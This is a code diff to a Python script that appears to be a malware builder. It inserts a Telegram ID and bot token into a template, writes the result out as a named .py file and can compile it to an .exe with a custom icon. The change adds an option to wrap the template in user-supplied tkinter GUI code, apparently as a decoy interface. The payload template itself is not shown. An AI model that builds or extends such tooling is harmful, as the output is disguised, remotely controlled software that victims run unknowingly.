@@ -71,10 +71,17 @@ MMM  M'  "MMM      "YMmMY"          MMM        ;;;;;YUMMM
     import os
     os.system('cls' if os.name == 'nt' else 'clear')
     print(Fore.CYAN + banners[randint(0, 3)])
-def make_python(ID, TOKEN, NAME):
+def make_python(ID, TOKEN, NAME, CODE_ADDR):
     with open("builder/build.py", "r") as read: 
         text = read.readlines()
-        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"')
+        with open(CODE_ADDR, "r") as read:
+            reader = read.readlines()
+            reader = "".join(reader)
+            reader = reader.split("\n")
+            tkinter_code = """"""
+            for i in reader:
+                tkinter_code += f"    {i}\n"
+        text = "".join(text).replace("TELEGRAM_ID", ID).replace("BOT_TOKEN", f'"{TOKEN}"').replace("TK_CODE", tkinter_code)
     system("mkdir output")
     with open(f"output/{NAME}.py", "w") as write:
         write.write(text)
@@ -102,7 +109,12 @@ try:
         if icon.endswith(".ico"): pass
     else: 
         icon = "icongallery/icon.ico"
-    make_python(ID=id, TOKEN=token, NAME=name)
+    code_addr = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custome tkinter code write C if not press enter: ")).lower()    
+    if code_addr == "c":
+        code_addr = input("write your code address(.py file): ")
+        if code_addr.endswith(".py"): pass
+    else: code_addr = "builder/tk_build.py"
+    make_python(ID=id, TOKEN=token, NAME=name, CODE_ADDR=code_addr)
     opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
     if opt == "y": 
         make_exe(NAME=name, ICON=icon)
